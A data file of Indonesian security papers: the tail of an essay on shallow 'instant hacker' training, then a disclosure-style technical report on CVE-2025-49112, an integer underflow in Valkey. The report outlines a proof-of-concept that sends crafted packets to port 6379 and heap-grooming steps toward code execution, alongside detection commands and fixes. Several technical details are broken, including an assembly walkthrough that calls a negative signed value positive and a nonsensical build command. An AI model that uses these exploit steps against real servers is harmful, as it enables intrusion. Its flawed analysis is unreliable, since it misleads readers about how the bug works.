        id: "s2-bab-8-2",
        title: "8.2 Peran Institusi Pendidikan",
        level: 2,
        content: [
          "Institusi pendidikan formal memiliki tanggung jawab untuk memastikan kurikulum teknologi yang diajarkan berbasis pada fondasi ilmiah yang kuat, bukan pada tren konten viral. Kolaborasi dengan praktisi industri yang memiliki track record yang dapat diverifikasi adalah prioritas yang mendesak."
        ]
      },
      {
        id: "s2-bab-8-3",
        title: "8.3 Peran Pemerintah dan Regulator",
        level: 2,
        content: [
          "BSSN, Kominfo, dan lembaga terkait memiliki peran dalam:",
          "-- Menyediakan kerangka kualifikasi yang diakui secara nasional untuk praktisi keamanan siber",
          "-- Mendukung program edukasi yang berbasis pada standar industri global yang diakui",
          "-- Memberikan panduan yang jelas tentang batasan legal pengujian keamanan siber",
          "-- Memperkuat penegakan hukum terhadap pemasaran kursus yang menyesatkan secara material"
        ]
      },
      {
        id: "s2-bab-9",
        title: "BAB IX: KESIMPULAN",
        level: 1,
        content: [
          "Makalah ini telah mendedikasikan dirinya untuk mendekonstruksi dua ilusi yang saling memperkuat dalam ekosistem teknologi Indonesia: ilusi bahwa menjadi hacker dapat diinstankan, dan ilusi bahwa pemrograman adalah opsional dalam perjalanan tersebut. Kedua ilusi ini berbahaya tidak hanya bagi individu yang mempercayainya, tetapi bagi seluruh ekosistem yang bergantung pada kompetensi yang nyata.",
          "Delapan temuan utama yang dihasilkan dari analisis ini:",
          "1. Hacker sejati adalah pemecah masalah, pembuat, dan penemu zero-day yang tidak bisa diinstankan. Ia bukan sekadar pengguna tools.",
          "2. Pemrograman adalah fondasi yang tidak dapat dinegosiasikan dalam keamanan siber. Narasi bahwa hacker tidak perlu coding adalah logika pembodohan.",
          "3. Fenomena instanisasi profesi teknologi adalah produk dari pertemuan antara motivasi komersial, optimasi algoritma media sosial, dan kesenjangan literasi digital.",
          "4. Script kiddie bukan label permanen. Ia adalah kondisi yang dapat diatasi dengan komitmen terhadap pembelajaran otentik. Namun ia berbahaya jika dibiarkan tanpa koreksi.",
          "5. Edukasi dangkal yang viral bukan hanya tidak berguna. Ia secara aktif berbahaya karena menciptakan false confidence dan mendorong perilaku yang tidak kompeten bahkan melanggar hukum.",
          "6. Tanggung jawab untuk melawan fenomena ini tidak terletak pada satu pihak saja. Ia didistribusikan di antara pembuat konten, platform, komunitas teknologi, institusi pendidikan, dan individu.",
          "7. Indonesia memiliki talenta teknologi yang nyata dan signifikan. Yang diperlukan bukan lebih banyak klaim keahlian, melainkan ekosistem yang menghargai dan mendukung proses pembelajaran yang jujur dan berbasis bukti.",
          "8. Tidak ada jalan pintas menuju kompetensi keamanan siber yang sesungguhnya. Hanya ada proses, konsistensi, dan dedikasi yang pada akhirnya menghasilkan kemampuan nyata yang dapat memberi kontribusi positif kepada komunitas dan dunia."
        ]
      }
    ],
    references: [
      "number01. (2025). Fenomena Developer Instan dan Miskonsepsi Tentang Hacker/Cybersecurity, Episode III. Medium. https://medium.com/@number01/fenomena-developer-instan-dan-miskonsepsi-tentang-hacker-cybersec-episode-iii-d5e4f5a03f5a",
      "pwn0sec. (2025). Ilusi Otomatisasi versus Realitas Eksploitasi: Mengapa AI Tidak Dapat Menggantikan Peneliti Keamanan (Jurnal Seri I). Jurnal Keamanan Siber dan Etika Teknologi Indonesia, Vol. 1 No. 1.",
      "Levy, S. (1984). Hackers: Heroes of the Computer Revolution. Anchor Press/Doubleday.",
      "Dunning, D. & Kruger, J. (1999). Unskilled and Unaware of It: How Difficulties in Recognizing One's Own Incompetence Lead to Inflated Self-Assessments. Journal of Personality and Social Psychology, 77(6), 1121-1134.",
      "OWASP Foundation. (2021). OWASP Top 10 Web Application Security Risks. https://owasp.org/Top10/",
      "MITRE Corporation. (2024). CWE Top 25 Most Dangerous Software Weaknesses 2024. https://cwe.mitre.org/top25/",
      "Offensive Security. (2024). PWK PEN-200: Penetration Testing with Kali Linux, OSCP Certification Overview. https://www.offensive-security.com/courses/pen-200/",
      "PortSwigger. (2024). Web Security Academy: Free Online Web Security Training. https://portswigger.net/web-security",
      "HackTheBox. (2024). HackTheBox: Hands-on Cybersecurity Learning Platform. https://www.hackthebox.com",
      "NVD / NIST. (2024). National Vulnerability Database. https://nvd.nist.gov/",
      "BSSN. (2024). Laporan Tahunan Keamanan Siber Nasional Indonesia 2023. https://bssn.go.id",
      "Exploit Database. (2024). Exploit-DB: The Official Exploit Database by Offensive Security. https://www.exploit-db.com",
      "Phrack Magazine. (2024). Phrack: An Underground ezine for Hackers. http://www.phrack.org",
      "ISC2. (2023). ISC2 Cybersecurity Workforce Study 2023. https://www.isc2.org/research",
      "Eric S. Raymond. (2001). How to Become a Hacker: The Original Essay. http://www.catb.org/~esr/faqs/hacker-howto.html"
    ]
  },
  {
    id: "ZERO-2025-003",
    title: "Analisis Teknis CVE-2025-49112: Integer Underflow pada Fungsi setDeferredReply() dalam Subsistem Jaringan Valkey",
    subtitle: "Studi Kasus Eksploitasi Unsigned Integer Underflow, Analisis Ghidra, dan Strategi Mitigasi pada Sistem Terdistribusi Berbasis C",
    classification: "CONFIDENTIAL",
    date: "April 2025",
    authors: ["@odaysec"],
    organization: "DPTL/0B208301740319",
    volume: "Vol. 1 No. 3",
    pages: 23,
    abstract: "Laporan ini menyajikan analisis teknis mendalam terhadap kerentanan CVE-2025-49112 yang ditemukan pada sistem Valkey, sebuah proyek open-source fork Redis yang banyak digunakan sebagai penyimpanan data in-memory berkecepatan tinggi. Kerentanan ini terklasifikasi sebagai CWE-191 (Integer Underflow / Wrap-Around) dan berlokasi pada fungsi setDeferredReply() dalam file networking.c. Kondisi kerentanan terjadi ketika operasi pengurangan unsigned integer antara nilai size dan used menghasilkan wrap-around jika used melampaui size, menciptakan nilai yang sangat besar (mendekati 2^32) yang kemudian digunakan sebagai ukuran dalam operasi akses memori. Dalam kondisi terburuk, eksploitasi kerentanan ini dapat menyebabkan heap buffer overflow, out-of-bounds write, dan potensi eksekusi kode jarak jauh pada sistem yang menjalankan Valkey tanpa patch. Laporan ini mencakup: (1) analisis kode sumber dan identifikasi root cause; (2) reproduksi kerentanan melalui proof-of-concept yang terverifikasi; (3) analisis disassembly menggunakan Ghidra; (4) skenario eksploitasi lengkap termasuk heap grooming; (5) identifikasi forensic artifacts; serta (6) rekomendasi mitigasi teknis yang komprehensif.",
    keywords: ["CVE-2025-49112", "GHSA-xhp4-6g9v-4xvj", "integer underflow", "unsigned integer wrap-around", "Valkey", "heap buffer overflow", "networking.c", "setDeferredReply", "CWE-191", "responsible disclosure", "Ghidra", "binary analysis", "keamanan memori"],
    sections: [
      // BAB I
      {
        id: "bab-1",
        title: "BAB I: PENDAHULUAN DAN LATAR BELAKANG",
        level: 1,
        content: []
      },
      {
        id: "bab-1-1",
        title: "1.1 Tentang Valkey",
        level: 2,
        content: [
          "Valkey adalah proyek open-source yang merupakan fork dari Redis, dikembangkan di bawah naungan Linux Foundation setelah Redis mengubah model lisensinya. Valkey mempertahankan kompatibilitas penuh dengan antarmuka Redis dan digunakan secara luas sebagai sistem penyimpanan key-value in-memory berkecepatan tinggi dalam berbagai arsitektur aplikasi modern, mulai dari caching, session management, message brokering, hingga real-time analytics.",
          "Karena posisi sentral Valkey dalam stack infrastruktur aplikasi modern, kerentanan keamanan pada komponen ini berpotensi memengaruhi jutaan sistem yang bergantung padanya secara langsung maupun tidak langsung. Riset keamanan terhadap Valkey oleh karenanya memiliki dampak yang signifikan terhadap ekosistem teknologi secara keseluruhan."
        ]
      },
      {
        id: "bab-1-2",
        title: "1.2 Penemuan dan Konteks Kerentanan",
        level: 2,
        content: [
          "Kerentanan CVE-2025-49112 ditemukan oleh peneliti keamanan @odaysec melalui analisis kode sumber Valkey, khususnya pada subsistem jaringan yang menangani komunikasi antar-komponen dalam mode cluster. Kerentanan ini termasuk dalam kategori yang sering diabaikan namun sangat berbahaya dalam sistem yang ditulis dalam bahasa C: integer underflow pada operasi aritmetika unsigned integer.",
          "Pada bahasa C, variabel unsigned integer tidak dapat menyimpan nilai negatif. Ketika operasi pengurangan menghasilkan nilai yang seharusnya negatif, hasilnya mengalami wrap-around menuju nilai maksimum dari tipe data tersebut. Untuk uint32_t, nilai ini adalah 4,294,967,295 (2^32 - 1). Nilai yang sangat besar ini kemudian dapat digunakan sebagai parameter ukuran dalam operasi memori, membuka peluang untuk serangan heap overflow."
        ]
      },
      {
        id: "bab-1-3",
        title: "1.3 Dampak dan Urgensi",
        level: 2,
        content: [
          "Dampak Potensial CVE-2025-49112:",
          "-- Denial of Service (DoS): crash server akibat akses memori di luar batas yang dialokasikan",
          "-- Heap Buffer Overflow: penulisan data di luar batas buffer heap yang dapat memengaruhi metadata alokasi",
          "-- Potensi Remote Code Execution: dalam skenario eksploitasi yang terstruktur dengan heap grooming",
          "-- Data Corruption: kerusakan struktur data in-memory yang tidak terduga",
          "-- Dampak terhadap seluruh klien yang terhubung ke instance Valkey yang terdampak"
        ]
      },
      // BAB II
      {
        id: "bab-2",
        title: "BAB II: LANDASAN TEKNIS INTEGER UNDERFLOW",
        level: 1,
        content: []
      },
      {
        id: "bab-2-1",
        title: "2.1 Memahami Unsigned Integer Arithmetic dalam C",
        level: 2,
        content: [
          "Bahasa pemrograman C mendefinisikan perilaku operasi aritmetika pada unsigned integer sebagai modular arithmetic, yaitu operasi dilakukan modulo 2^N di mana N adalah lebar bit tipe data. Ini berarti bahwa operasi yang menghasilkan nilai di luar rentang representasi tipe data tidak menghasilkan error, melainkan menghasilkan hasil yang di-wrap-around secara deterministik.",
          "[QUOTE:uint32_t size = 50; uint32_t used = 100; uint32_t remaining = size - used; → Hasil bukan -50, melainkan: 50 - 100 = -50 (mod 2^32) = 4294967246. Nilai ini akan digunakan sebagai ukuran buffer = SANGAT BERBAHAYA]"
        ]
      },
      {
        id: "bab-2-2",
        title: "2.2 Perbedaan Signed vs Unsigned Integer dalam Konteks Keamanan",
        level: 2,
        content: [
          "[TABLE_HEADER:KARAKTERISTIK|SIGNED INTEGER (int32_t)|UNSIGNED INTEGER (uint32_t)]",
          "[TABLE:[Rentang|-2,147,483,648 s.d. +2,147,483,647|0 s.d. 4,294,967,295],[Overflow/Underflow|Undefined Behavior|Wrap-Around (didefinisikan oleh standar C)],[50 - 100|= -50 (negatif, detektable)|= 4,294,967,246 (positif besar, tidak terdeteksi)],[Kondisi if (result > 0)|BENAR jika positif|BENAR untuk nilai underflow (bahaya!)],[Perbandingan|Signed lebih aman untuk ukuran buffer|Unsigned rentan tanpa validasi pre-condition]]"
        ]
      },
      {
        id: "bab-2-3",
        title: "2.3 Mengapa Kondisi ini Tidak Terdeteksi oleh Kompiler",
        level: 2,
        content: [
          "Kompiler C standar tidak mengeluarkan warning untuk operasi pengurangan unsigned integer yang berpotensi underflow, karena dari perspektif bahasa, operasi tersebut adalah perilaku yang terdefinisikan (well-defined behavior) dan legal sepenuhnya. Ini menciptakan kondisi di mana kode yang berbahaya secara semantis terlihat benar secara sintaksis dan lolos dari semua pemeriksaan kompiler standar.",
          "[QUOTE:ISO/IEC 9899:2018 (C18) Pasal 6.2.5.9 mendefinisikan bahwa: operasi aritmetika unsigned integer tidak pernah overflow; hasil selalu direduksi modulo angka yang satu lebih besar dari nilai terbesar yang dapat direpresentasikan oleh tipe hasil. Ini berarti wrap-around adalah perilaku yang terdefinisikan dan tidak dapat di-detect hanya dengan sanitizer standar tanpa flag khusus seperti -fsanitize=unsigned-integer-overflow.]"
        ]
      },
      // BAB III
      {
        id: "bab-3",
        title: "BAB III: ANALISIS KODE SUMBER DAN IDENTIFIKASI ROOT CAUSE",
        level: 1,
        content: []
      },
      {
        id: "bab-3-1",
        title: "3.1 Lokasi Kerentanan: networking.c setDeferredReply()",
        level: 2,
        content: [
          "Kerentanan berlokasi di dalam fungsi setDeferredReply() pada file networking.c. Fungsi ini bertanggung jawab untuk menetapkan balasan yang ditangguhkan (deferred reply) dalam konteks komunikasi jaringan antar-node Valkey. Pada bagian kritis fungsi ini, terdapat pengecekan kondisi yang menggunakan operasi pengurangan unsigned integer tanpa validasi pre-condition yang memadai."
        ]
      },
      {
        id: "bab-3-2",
        title: "3.2 Kode Rentan dan Penjelasan Teknis",
        level: 2,
        content: [
          "[QUOTE:if (prev->size - prev->used > 0) { // Jika prev->used > prev->size, maka: prev->size - prev->used = LARGE_POSITIVE_VALUE (underflow!) // Kondisi > 0 selalu TRUE untuk nilai wrap-around // Kode di dalam blok ini akan dieksekusi dengan ukuran yang salah }]",
          "Masalah utama pada kode di atas terletak pada asumsi implisit bahwa nilai prev->used tidak akan pernah melebihi prev->size. Dalam operasi normal, asumsi ini mungkin valid. Namun ketika penyerang dapat memanipulasi ukuran paket yang dikirim ke server, asumsi ini dapat dilanggar, mengakibatkan kondisi underflow yang tidak terdeteksi oleh pengecekan kondisi."
        ]
      },
      {
        id: "bab-3-3",
        title: "3.3 Analisis Skenario Trigger",
        level: 2,
        content: [
          "Secara teknis, kondisi kerentanan dapat dipicu melalui langkah-langkah berikut:",
          "1. Penyerang mengirimkan paket yang telah dimanipulasi ke port Valkey (default: 6379) dengan nilai size header yang kecil namun nilai used yang melebihinya.",
          "2. Fungsi setDeferredReply() membaca nilai prev->size dan prev->used dari buffer paket yang dikendalikan penyerang.",
          "3. Operasi pengurangan prev->size - prev->used menghasilkan nilai wrap-around mendekati 4,294,967,246 untuk uint32_t.",
          "4. Kondisi if (prev->size - prev->used > 0) mengevaluasi menjadi TRUE karena nilai wrap-around adalah positif.",
          "5. Kode dalam blok kondisi dieksekusi menggunakan nilai ukuran yang salah, memungkinkan akses memori di luar batas yang dialokasikan."
        ]
      },
      // BAB IV
      {
        id: "bab-4",
        title: "BAB IV: ANALISIS BINER MENGGUNAKAN GHIDRA",
        level: 1,
        content: []
      },
      {
        id: "bab-4-1",
        title: "4.1 Metodologi Reverse Engineering",
        level: 2,
        content: [
          "Untuk memperdalam pemahaman tentang perilaku kerentanan pada level biner, penelitian ini menggunakan Ghidra (NSA Security Research Tool) versi 11.x untuk melakukan disassembly dan decompilasi biner Valkey yang dikompilasi pada commit yang terdampak. Analisis biner memungkinkan peneliti untuk memverifikasi bahwa perilaku underflow yang diidentifikasi pada level kode sumber juga tercermin pada level instruksi mesin."
        ]
      },
      {
        id: "bab-4-2",
        title: "4.2 Langkah Analisis Ghidra",
        level: 2,
        content: [
          "1. Kompilasi Valkey dari commit yang terdampak (daea05b1) dengan debug symbols: gcc -g -O0 -o valkey-server src.c",
          "2. Import binary ke Ghidra melalui File > Import File > valkey-server, pilih format ELF dan arsitektur x86-64.",
          "3. Jalankan Auto Analysis dengan semua analyzer aktif termasuk Aggressive Instruction Finder dan Function Start Search.",
          "4. Navigasi ke fungsi setDeferredReply() melalui Symbol Tree atau search function.",
          "5. Identifikasi instruksi SUB (subtract) dalam decompiled output di Decompiler window.",
          "6. Annotasi instruksi yang relevan untuk dokumentasi dan verifikasi perilaku unsigned comparison."
        ]
      },
      {
        id: "bab-4-3",
        title: "4.3 Output Decompilasi Ghidra",
        level: 2,
        content: [
          "[QUOTE:void setDeferredReply(client *c, void *node, const char *s, size_t length) → Instruksi Assembly: MOV EAX, [RBX+0x10] (load prev->size) → MOV ECX, [RBX+0x14] (load prev->used) → SUB EAX, ECX (UNSIGNED!) → TEST EAX, EAX → JLE 0x4A1F2 (jump jika <= 0, TIDAK TERCAPAI jika underflow!) → if (old->size - old->used > 0) ← TITIK KERENTANAN]"
        ]
      },
      {
        id: "bab-4-4",
        title: "4.4 Analisis Instruksi Assembly Kritis",
        level: 2,
        content: [
          "Pada level assembly x86-64, operasi yang bermasalah terlihat sangat jelas. Instruksi SUB pada arsitektur x86 tidak membedakan antara signed dan unsigned subtraction dalam hal operasi bit-level. Perbedaannya hanya terletak pada interpretasi flag hasil (CF untuk unsigned, OF untuk signed). Kode yang terdampak menggunakan perbandingan yang tidak memperhatikan Carry Flag (CF), sehingga kondisi underflow tidak terdeteksi.",
          "[QUOTE:0x004A1D8A: MOV EAX, [RBX+0x10] → EAX = prev->size (50) | 0x004A1D8D: MOV ECX, [RBX+0x14] → ECX = prev->used (100) | 0x004A1D90: SUB EAX, ECX → EAX = 50 - 100 = 0xFFFFFFCE, CF=1 (underflow!) tapi kode tidak memeriksa CF | 0x004A1D92: TEST EAX, EAX → Zero flag check | 0x004A1D94: JLE 0x004A1F20 → Jump if <= 0 (SIGNED compare!) → EAX = 0xFFFFFFCE > 0 sebagai SIGNED → Kondisi JLE TIDAK diambil = BUG!]"
        ]
      },
      // BAB V
      {
        id: "bab-5",
        title: "BAB V: REPRODUKSI KERENTANAN DAN PROOF OF CONCEPT",
        level: 1,
        content: []
      },
      {
        id: "bab-5-1",
        title: "5.1 Lingkungan Pengujian",
        level: 2,
        content: [
          "[TABLE_HEADER:KOMPONEN|SPESIFIKASI]",
          "[TABLE:[Sistem Operasi|Ubuntu 22.04 LTS x86-64 (terisolasi di VM)],[Compiler|GCC 11.4.0],[Target Commit|daea05b1e26db29bfd1c033e27f9d519a2f8ccbb],[Port Valkey|6379 (default)],[Tools Analisis|Ghidra 11.x, GDB 12.1, Valgrind 3.19, Python 3.11],[Lingkungan|Air-gapped VM, tidak terhubung ke jaringan publik]]"
        ]
      },
      {
        id: "bab-5-2",
        title: "5.2 Langkah Reproduksi: Kompilasi Target",
        level: 2,
        content: [
          "[QUOTE:Step 1: git clone https://github.com/valkey-io/valkey.git | Step 2: git checkout daea05b1e26db29bfd1c033e27f9d519a2f8ccbb | Step 3: make CFLAGS='-g -O0 -fsanitize=unsigned-integer-overflow' | Step 4: ls -la src/valkey-server → Output: ELF 64-bit LSB pie executable]"
        ]
      },
      {
        id: "bab-5-3",
        title: "5.3 Demonstrasi Proof of Concept: Underflow",
        level: 2,
        content: [
          "Untuk mengilustrasikan perilaku underflow secara terisolasi sebelum eksploitasi penuh, berikut adalah program C yang mereproduksi kondisi kerentanan:",
          "[QUOTE:process_buffer(100, 50) → remaining = 50 bytes (BENAR, kasus normal) | process_buffer(50, 100) → remaining = 4294967246 bytes (SALAH! Wrap-around, kondisi if TETAP TRUE) | process_buffer(100, 100) → remaining = 0, kondisi if FALSE (aman)]"
        ]
      },
      {
        id: "bab-5-4",
        title: "5.4 Eksploitasi Jaringan: Mengirim Paket Berbahaya",
        level: 2,
        content: [
          "Setelah underflow berhasil didemonstrasikan secara terisolasi, langkah berikutnya adalah mereplikasi kondisi ini melalui koneksi jaringan ke server Valkey yang aktif. Script Python mengilustrasikan bagaimana penyerang dapat memanipulasi nilai size dan used melalui paket yang dikirim ke port Valkey:",
          "[QUOTE:create_underflow_packet(size_val=50, used_val=300) → Pack sebagai unsigned 32-bit big-endian → size=50, used=300: 50 - 300 = 4294967046 (underflow!) → Kirim ke TARGET_HOST:6379 → Monitor log server untuk SIGSEGV atau crash]"
        ]
      },
      {
        id: "bab-5-5",
        title: "5.5 Heap Grooming untuk Eksploitasi yang Lebih Reliabel",
        level: 2,
        content: [
          "Dalam skenario eksploitasi tingkat lanjut, penyerang dapat menggunakan teknik heap grooming untuk menempatkan objek target (seperti function pointer atau vtable) pada posisi memori yang dapat ditimpa melalui operasi out-of-bounds write yang diakibatkan oleh underflow.",
          "-- Phase 1: Spray heap dengan objek-objek berukuran tertentu (100x clientReplyBlock 64 bytes)",
          "-- Phase 2: Buat lubang (hole) pada heap dengan membebaskan setiap objek genap untuk membuat fragmentasi",
          "-- Phase 3: Alokasikan objek target di lubang yang tersedia tepat setelah buffer yang akan di-overflow",
          "-- Phase 4: Trigger underflow dengan send_packet(TARGET, 50, 300) → 50 - 300 = underflow, data penyerang menimpa objek target"
        ]
      },
      // BAB VI
      {
        id: "bab-6",
        title: "BAB VI: FORENSIC ARTIFACTS DAN DETEKSI SERANGAN",
        level: 1,
        content: []
      },
      {
        id: "bab-6-1",
        title: "6.1 Indikator Kompromi pada System Log",
        level: 2,
        content: [
          "Ketika kondisi integer underflow memicu akses memori yang tidak valid, sistem operasi dan Valkey sendiri menghasilkan sejumlah artefak forensik yang dapat digunakan untuk mendeteksi upaya eksploitasi:",
          "1. Periksa segmentation fault Valkey: grep -i 'valkey.*segfault|valkey.*SIGSEGV' /var/log/syslog",
          "2. Periksa kernel log: dmesg | grep -i 'valkey|segfault|general protection'",
          "3. Monitor koneksi aktif: ss -tnp | grep ':6379'",
          "4. Capture traffic: tcpdump -i lo 'tcp port 6379' -w valkey_capture.pcap",
          "5. Monitor memory usage: cat /proc/$(pgrep valkey)/status",
          "6. Periksa core dump: coredumpctl info valkey-server"
        ]
      },
      {
        id: "bab-6-2",
        title: "6.2 Analisis Traffic Jaringan: Pola Paket Anomali",
        level: 2,
        content: [
          "Pada level jaringan, upaya eksploitasi CVE-2025-49112 dapat diidentifikasi melalui pola paket yang tidak normal. Paket yang dirancang untuk memicu underflow akan memiliki nilai header yang tidak konsisten, di mana nilai used secara signifikan melebihi nilai size.",
          "[QUOTE:Filter Wireshark: tcp.port == 6379 and tcp.payload | Tanda merah: payload byte [0:4] (size) < payload byte [4:8] (used) → Deteksi paket anomali yang mengindikasikan eksploitasi]"
        ]
      },
      {
        id: "bab-6-3",
        title: "6.3 Indikator Kompromi (IoC) Rangkuman",
        level: 2,
        content: [
          "[TABLE_HEADER:INDIKATOR KOMPROMI|INTERPRETASI]",
          "[TABLE:[Kernel segfault/SIGSEGV pada proses valkey-server|Prioritas Tinggi: kemungkinan eksploitasi berhasil],[Koneksi TCP port 6379 dengan payload pendek berulang|Kemungkinan reconnaissance atau fuzzing],[Paket dengan nilai used melebihi size pada header|Indikasi langsung trigger underflow],[Penurunan drastis memori tersedia pada host Valkey|Kemungkinan heap exhaustion atau corruption],[Core dump dari proses valkey-server|Eksploitasi kemungkinan berhasil men-crash server],[Lonjakan koneksi dari satu sumber IP|Kemungkinan heap grooming atau brute force]]"
        ]
      },
      // BAB VII
      {
        id: "bab-7",
        title: "BAB VII: STRATEGI MITIGASI DAN REKOMENDASI TEKNIS",
        level: 1,
        content: []
      },
      {
        id: "bab-7-1",
        title: "7.1 Perbaikan Kode: Solusi Utama",
        level: 2,
        content: [
          "Perbaikan yang tepat untuk kerentanan ini adalah menambahkan pengecekan pre-condition sebelum melakukan operasi pengurangan unsigned integer:",
          "[QUOTE:SEBELUM (RENTAN): if (prev->size - prev->used > 0) { ... } | SESUDAH (AMAN): if (prev->used < prev->size) { size_t remaining = prev->size - prev->used; ... } → Perbandingan langsung, bukan pengurangan. Sekarang aman karena used < size dijamin.]"
        ]
      },
      {
        id: "bab-7-2",
        title: "7.2 Perbaikan dengan C23 Checked Arithmetic",
        level: 2,
        content: [
          "[QUOTE:#include <stdckdint.h> (C23 standard) | if (!ckd_sub(&remaining, prev->size, prev->used)) { /* Aman: remaining valid */ } else { /* Handle error: used melebihi size */ serverLog(LL_WARNING, \"setDeferredReply: invalid buffer state\"); }]",
          "Fungsi ckd_sub() mengembalikan true jika overflow/underflow terjadi, memberikan deteksi eksplisit yang tidak mungkin dilakukan dengan operasi aritmetika biasa."
        ]
      },
      {
        id: "bab-7-3",
        title: "7.3 Perbaikan Defensif: Menggunakan size_t",
        level: 2,
        content: [
          "Gunakan size_t (platform-native unsigned) daripada uint32_t dan tambahkan assertion untuk verifikasi di debug build:",
          "[QUOTE:typedef struct clientReplyBlock { size_t size; size_t used; char buf[]; }; | assert(prev->used <= prev->size); // Crash di debug build jika invariant dilanggar | if (prev->used < prev->size) { size_t remaining = prev->size - prev->used; ... }]"
        ]
      },
      {
        id: "bab-7-4",
        title: "7.4 Rekomendasi Kompilasi: Sanitizer Flags",
        level: 2,
        content: [
          "[QUOTE:GCC: gcc -fsanitize=undefined -fsanitize=unsigned-integer-overflow -fno-sanitize-recover=all | Clang: clang -fsanitize=undefined -fsanitize=unsigned-integer-overflow -fsanitize-trap=all | Production (ASan): gcc -fsanitize=address -fsanitize=leak -fno-omit-frame-pointer]"
        ]
      },
      {
        id: "bab-7-5",
        title: "7.5 Rekomendasi Operasional",
        level: 2,
        content: [
          "Langkah Mitigasi Segera (Prioritas Tinggi):",
          "-- Update Valkey ke versi yang sudah mengandung patch untuk CVE-2025-49112 sesegera mungkin",
          "-- Batasi akses ke port Valkey (6379) hanya dari IP yang dipercaya menggunakan firewall rules",
          "-- Nonaktifkan akses Valkey dari jaringan publik jika tidak diperlukan",
          "-- Aktifkan Valkey authentication (requirepass) untuk lapisan perlindungan tambahan",
          "-- Monitor log sistem dan Valkey untuk indikator kompromi yang disebutkan pada Bab VI",
          "",
          "Rekomendasi Jangka Panjang:",
          "-- Terapkan static analysis tools (Clang Static Analyzer, Coverity, atau CodeQL) pada pipeline CI/CD",
          "-- Integrasikan fuzzing (AFL++, libFuzzer) untuk komponen networking Valkey",
          "-- Pertimbangkan adopsi Rust untuk komponen baru yang memerlukan keamanan memori tinggi"
        ]
      },
      // BAB VIII
      {
        id: "bab-8",
        title: "BAB VIII: RESPONSIBLE DISCLOSURE TIMELINE",
        level: 1,
        content: []
      },
      {
        id: "bab-8-1",
        title: "8.1 Kronologi Penemuan dan Pengungkapan",
        level: 2,
        content: [
          "[TABLE_HEADER:TANGGAL|KEJADIAN DAN KETERANGAN]",
          "[TABLE:[2025-02-19|Penemuan kerentanan oleh @odaysec melalui analisis kode sumber networking.c. Identifikasi awal melalui code review dan fuzzing dasar.],[2025-02-19|Verifikasi melalui proof-of-concept dan reproduksi lokal pada lingkungan terisolasi. Konfirmasi kondisi underflow dapat dipicu melalui koneksi jaringan.],[2025-02-20|Analisis mendalam menggunakan Ghidra untuk verifikasi perilaku di level biner. Dokumentasi teknis lengkap disiapkan.],[2025-02-20|Pengiriman laporan kerentanan secara privat kepada tim keamanan Valkey melalui saluran responsible disclosure.],[2025-02-xx|Konfirmasi penerimaan laporan dari tim Valkey. Proses triage dan verifikasi internal dimulai.],[2025-xx-xx|Penetapan CVE-2025-49112 oleh CNA dan penerbitan GHSA-xhp4-6g9v-4xvj.],[2025-xx-xx|Patch tersedia dan dirilis sebagai bagian dari pembaruan keamanan Valkey.],[2025-04-xx|Pengungkapan publik melalui GitHub Security Advisory setelah patch tersedia.]]"
        ]
      },
      {
        id: "bab-8-2",
        title: "8.2 Pernyataan Etika dan Responsible Disclosure",
        level: 2,
        content: [
          "Penelitian ini dilakukan sepenuhnya sesuai dengan prinsip-prinsip responsible disclosure yang ditetapkan oleh komunitas keamanan siber internasional. Kerentanan tidak pernah dieksploitasi pada sistem produksi tanpa izin. Seluruh pengujian dilakukan di lingkungan terisolasi yang sepenuhnya dimiliki dan dikontrol oleh peneliti.",
          "Laporan dikirimkan secara privat kepada tim Valkey sebelum pengungkapan publik, memberikan waktu yang memadai untuk perbaikan. Informasi teknis sensitif yang dapat langsung digunakan untuk serangan telah disanitasi dari laporan publik ini. Tujuan satu-satunya dari publikasi ini adalah meningkatkan kesadaran komunitas terhadap pola kerentanan integer underflow."
        ]
      },
      // BAB IX
      {
        id: "bab-9",
        title: "BAB IX: KESIMPULAN DAN PEMBELAJARAN",
        level: 1,
        content: []
      },
      {
        id: "bab-9-1",
        title: "9.1 Ringkasan Temuan",
        level: 2,
        content: [
          "Kerentanan CVE-2025-49112 pada Valkey adalah contoh yang sangat baik dari kategori kerentanan yang dapat lolos dari code review standar karena berkaitan dengan perilaku bahasa C yang terdefinisikan namun kontra-intuitif. Integer underflow pada unsigned integer arithmetic tidak menghasilkan error kompiler, tidak selalu terdeteksi oleh sanitizer standar, dan dapat mengakibatkan kondisi keamanan yang sangat serius.",
          "Enam poin pembelajaran utama dari penelitian ini:",
          "1. Operasi pengurangan unsigned integer dalam C yang dapat menghasilkan nilai negatif adalah sumber kerentanan yang tersembunyi namun sangat berbahaya, khususnya ketika hasil operasi digunakan sebagai ukuran buffer.",
          "2. Kondisi if (a - b > 0) untuk unsigned integer tidak setara dengan if (a > b). Keduanya menghasilkan hasil yang berbeda ketika b > a, dan pemilihan yang salah dapat membuka celah keamanan kritis.",
          "3. Analisis biner menggunakan Ghidra memungkinkan verifikasi perilaku kerentanan pada level instruksi mesin, yang penting untuk membuktikan bahwa perbaikan kode sumber benar-benar menghasilkan kode biner yang aman.",
          "4. Heap grooming dapat mengubah kerentanan yang awalnya hanya DoS menjadi primitive eksploitasi yang lebih powerful.",
          "5. Artefak forensik dari upaya eksploitasi integer underflow dapat diidentifikasi dan dimonitor oleh tim defensif.",
          "6. Pola kerentanan serupa (CWE-191) kemungkinan besar ada di komponen lain dari Valkey dan proyek open-source berbasis C lainnya. Audit kode sistematis sangat direkomendasikan."
        ]
      }
    ],
    references: [
      "GitHub Security Advisory Database. (2025). GHSA-xhp4-6g9v-4xvj: Integer Underflow in Valkey setDeferredReply(). https://github.com/advisories/GHSA-xhp4-6g9v-4xvj",
      "National Vulnerability Database / NIST. (2025). CVE-2025-49112: Valkey Unsigned Integer Underflow in networking.c. https://nvd.nist.gov/vuln/detail/CVE-2025-49112",
      "Valkey Project. (2025). Valkey Source Code Repository: valkey-io/valkey. https://github.com/valkey-io/valkey",
      "odaysec. (2025). Vulnerability Discovery: CVE-2025-49112 - Integer Underflow setDeferredReply Valkey. https://github.com/advisories/GHSA-xhp4-6g9v-4xvj",
      "National Security Agency (NSA). (2024). Ghidra Software Reverse Engineering Framework. https://ghidra-sre.org/",
      "ISO/IEC. (2018). ISO/IEC 9899:2018 - Programming Languages: C (C18 Standard). https://www.iso.org/standard/74528.html",
      "MITRE Corporation. (2024). CWE-191: Integer Underflow (Wrap or Wraparound). https://cwe.mitre.org/data/definitions/191.html",
      "OpenSSF. (2024). Guide to Coordinated Vulnerability Disclosure. https://openssf.org/blog/2023/06/22/guide-to-coordinated-vulnerability-disclosure/",
      "Seacord, R.C. (2013). Secure Coding in C and C++ (2nd Edition): Chapter 5 - Integer Security. Addison-Wesley Professional.",
